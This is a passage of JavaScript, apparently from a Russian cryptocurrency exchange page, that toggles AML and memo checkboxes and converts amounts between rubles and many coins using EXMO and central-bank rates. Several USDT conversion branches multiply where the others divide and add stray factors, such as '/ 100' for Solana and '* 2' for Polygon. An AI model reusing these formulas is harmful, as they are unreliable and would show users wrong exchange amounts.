            document.querySelector('.rec__title-namewallet').textContent = `Карта РНКБ`;
        } 

    }

}

// Check на AML

let activeAML = false;
document.querySelector('.rec__aml').addEventListener('click', event => {
    if ( activeAML == false ) {
        document.querySelector('.rec__check svg').style.display = 'block';
        activeAML = true;
        needAML = false;

        document.querySelector('.rec__check').style.border = '2px solid #cfcfcf';
        document.querySelectorAll('.rec__red').forEach( (item, i) => {
            if ( i == 0 ) {
                item.style.color = '#2e4057';
            } else {
                item.style.color = '#f73';
            }
        })
    } else {
        document.querySelector('.rec__check svg').style.display = 'none';
        activeAML = false;
        needAML = true;
    }
})

// Check на тег

let activeTag = false;
document.querySelector('.rec__tag').addEventListener('click', event => {
    if ( activeTag == false ) {
        document.querySelector('.rec__tag-check svg').style.display = 'block';
        document.querySelector('.rec__over').style.display = 'block';
        document.querySelector('.rec__tage input').value = '';
        activeTag = true;
        needMEMO = false;
        document.querySelectorAll('.first__message')[4].style.display = 'none';
        document.querySelector('.rec__tage').style.border = '2px solid #cfcfcf';
        document.querySelector('.rec__tage').style.marginBottom = '20px';
    } else {
        document.querySelector('.rec__tag-check svg').style.display = 'none';
        document.querySelector('.rec__over').style.display = 'none';
        activeTag = false;
        needMEMO = true;
    }
})

// Обработка первого импута

document.querySelector('.first__input-one').addEventListener('input', event => {
    calcFirstInput();
    document.querySelectorAll('.first__message')[1].style.display = 'none';
    document.querySelectorAll('.first__table')[1].style.border = '2px solid #cfcfcf';
    document.querySelectorAll('.first__table')[1].style.marginBottom = '0px';
})

function calcFirstInput() {

    document.querySelectorAll('.first__loading img')[0].style.display = 'block';
    document.querySelectorAll('.first__loading img')[1].style.display = 'block';

    fetch('https://api.exmo.com/v1/ticker/').then(async(result) => {
        if (result.status === 200 && result.ok) {
            return result.json()
        }
    }).then((JSON_DATA) => {

        async function getCurrencies(){  
            const url = 'https://www.cbr-xml-daily.ru/daily_json.js';
            const response = await fetch(url);
            const data = await response.json();

            if ( valuteCategoryFirst == 'SBP' || valuteCategoryFirst == 'BANK' ) {

                if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_BTC ).toFixed(6) ;
                } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_USDT ).toFixed(2) ;
                } else if ( valuteSecondName == 'Dai (DAI)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_DAI ).toFixed(3) ;
                } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_DOT ).toFixed(3) ;
                } else if ( valuteSecondName == 'Solana (SOL)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_SOL ).toFixed(3) ;
                } else if ( valuteSecondName == 'Polygon (POL)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_POL ).toFixed(2) ;
                } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' || valuteSecondName == 'Ethereum (ETH)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_ETH ).toFixed(6) ;
                } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_ARB ).toFixed(6) ;
                } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_LTC ).toFixed(6) ;
                } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_BCH ).toFixed(6) ;
                } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_XRP ).toFixed(2) ;
                } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_DOGE ).toFixed(2) ;
                } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_ETC ).toFixed(6) ;
                } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_XLM ).toFixed(2) ;
                } else if ( valuteSecondName == 'Tron (TRX)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_TRX ).toFixed(6) ;
                } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_TON ).toFixed(6) ;
                } else if ( valuteSecondName == 'Dash (DASH)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_DASH ).toFixed(6);
                } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_ZEC ).toFixed(6);
                } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_BNB ).toFixed(6);
                } else if ( valuteSecondName == 'Monero (XMR)' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value ) / PRICE_XMR ).toFixed(6);
                } else if ( valuteSecondName == 'ЮMoney' ) {
                    document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / data.Valute.USD.Value )  ).toFixed(2) ;
                }
            } else if ( valuteCategoryFirst == 'PAYSYSTEM' ) {

                document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value )  ).toFixed(0);
                if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                    let fullNumber = String(document.querySelector('.first__input-two').value);
                    document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                }
            } else if ( valuteCategoryFirst == 'CRYPTO' ) {

                if ( valuteFirstName == 'Bitcoin (BTC)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_BTC ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_DOT ).toFixed(2);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_SOL ).toFixed(2);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_ETH ).toFixed(2);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_LTC ).toFixed(2);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_BCH ).toFixed(2);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_BTC ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Tether ERC20 (USDT)' || valuteFirstName == 'Tether TRC20 (USDT)' || valuteFirstName == 'USD Coin ERC20 (USDC)' || valuteFirstName == 'USD Coin SOL (USDC)' || valuteFirstName == 'Tether BEP20 (USDT)' || valuteFirstName == 'Tether SOL (USDT)' || valuteFirstName == 'Tether TON (USDT)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_USDT ).toFixed(0);
                        // document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) ).toFixed(0);
                        // document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) ).toFixed(2);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_BTC ) ).toFixed(8);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DAI ) ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) ).toFixed(2);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / 100 ).toFixed(2);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_POL ) * 2 ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_ETH )  ).toFixed(6);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_ARB ) ).toFixed(2);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_LTC )  ).toFixed(3);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_BCH )  ).toFixed(6);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_XRP )  ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_DOGE )  ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_ETC )  ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_XLM )  ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_TRX )  ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_TON )  ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_DASH ) ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_ZEC ) ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_BNB ) ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value / PRICE_XMR ) ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Dai (DAI)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_DAI ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_DOT ).toFixed(2);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_SOL ).toFixed(3);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_ETH ).toFixed(6);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_USDT ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Polkadot (DOT)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_DOT ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_SOL ).toFixed(3);
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_ETH ).toFixed(6);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_XRP ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_DOGE ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Classic (ETC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_ETC ).toFixed(2);
                    } else if ( valuteSecondName == 'Stellar (XLM)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_XLM ).toFixed(2);
                    } else if ( valuteSecondName == 'Tron (TRX)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_TRX ).toFixed(2);
                    } else if ( valuteSecondName == 'Toncoin (TON)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_TON ).toFixed(2);
                    } else if ( valuteSecondName == 'Dash (DASH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_DASH ).toFixed(2);
                    } else if ( valuteSecondName == 'Zcash (ZEC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_ZEC ).toFixed(2);
                    } else if ( valuteSecondName == 'Binance Coin (BNB BEP20)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_BNB ).toFixed(2);
                    } else if ( valuteSecondName == 'Monero (XMR)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_DOT ) / PRICE_XMR ).toFixed(2);
                    }

                } else if ( valuteFirstName == 'Solana (SOL)' ) {
                    if ( valuteCategorySecond == 'SBP' || valuteCategorySecond == 'BANK' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * data.Valute.USD.Value ) * PRICE_SOL ).toFixed(0);
                        if ( Number(document.querySelector('.first__input-two').value) > 99 ) {
                            let fullNumber = String(document.querySelector('.first__input-two').value);
                            document.querySelector('.first__input-two').value = `${fullNumber.slice(0, fullNumber.length - 2)}00`;
                        }
                    } else if ( valuteSecondName == 'Bitcoin (BTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) /  PRICE_BTC ).toFixed(6);
                    } else if ( valuteSecondName == 'Tether ERC20 (USDT)' || valuteSecondName == 'Tether TRC20 (USDT)' || valuteSecondName == 'USD Coin ERC20 (USDC)' || valuteSecondName == 'Tether BEP20 (USDT)' || valuteSecondName == 'Tether SOL (USDT)' || valuteSecondName == 'Tether TON (USDT)' || valuteSecondName == 'USD Coin SOL (USDC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_USDT ).toFixed(2);
                    } else if ( valuteSecondName == 'Dai (DAI)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_DAI ).toFixed(2);
                    } else if ( valuteSecondName == 'Polkadot (DOT)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_DOT ).toFixed(3);
                    } else if ( valuteSecondName == 'Solana (SOL)' ) {
                        document.querySelector('.first__input-two').value = document.querySelector('.first__input-one').value;
                    } else if ( valuteSecondName == 'Polygon (POL)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_POL ).toFixed(2);
                    } else if ( valuteSecondName == 'Ethereum Arbitrum (ETH)' || valuteSecondName == 'Ethereum (ETH)' || valuteSecondName == 'Ethereum Optimism (ETH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_ETH ).toFixed(6);
                    } else if ( valuteSecondName == 'Arbitrum one (ARB)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_ARB ).toFixed(2);
                    } else if ( valuteSecondName == 'Litecoin (LTC)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_LTC ).toFixed(3);
                    } else if ( valuteSecondName == 'Bitcoin Cash (BCH)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_BCH ).toFixed(6);
                    } else if ( valuteSecondName == 'Ripple (XRP)' ) {
                        document.querySelector('.first__input-two').value = ( ( document.querySelector('.first__input-one').value * PRICE_SOL ) / PRICE_XRP  ).toFixed(2);
                    } else if ( valuteSecondName == 'Dogecoin (DOGE)' ) {
